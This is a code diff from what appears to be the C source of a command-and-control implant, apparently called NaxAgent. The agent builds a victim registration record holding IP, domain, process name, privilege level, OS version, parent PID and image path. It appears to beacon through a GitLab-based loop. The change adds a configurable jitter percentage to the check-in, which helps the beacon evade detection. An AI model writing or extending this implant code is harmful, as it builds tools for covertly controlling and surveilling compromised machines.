@@ -113,9 +113,10 @@ extern int nax_build_reg_body(
     const char *ip, uint32_t ip_len,
     const char *domain, uint32_t domain_len,
     const char *procname, uint32_t procname_len,
-    uint8_t elevated, uint8_t os_major, uint8_t os_minor, uint16_t os_build,
+    uint8_t elevated, uint32_t os_major, uint32_t os_minor, uint16_t os_build,
     uint32_t ppid, uint32_t _r1, uint32_t _r2,
     const char *imgpath, uint32_t imgpath_len,
+    uint8_t jitter_pct,
     uint8_t *out, uint32_t *out_len);
 extern void nax_gather_sysinfo(NaxSysInfo *info);
 extern uint32_t nax_process_downloads(NaxAgent *a, uint8_t *out, uint32_t out_cap);
@@ -613,6 +614,7 @@ void nax_gitlab_main(NaxAgent *a)
                     info.elevated, info.os_major, info.os_minor, info.os_build,
                     info.ppid, 0, 0,
                     info.imgpath, strlen(info.imgpath),
+                    (uint8_t)a->cfg.jitter_pct,
                     reg_body, &reg_body_len) < 0) { sleep(3); continue; }
 
             uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
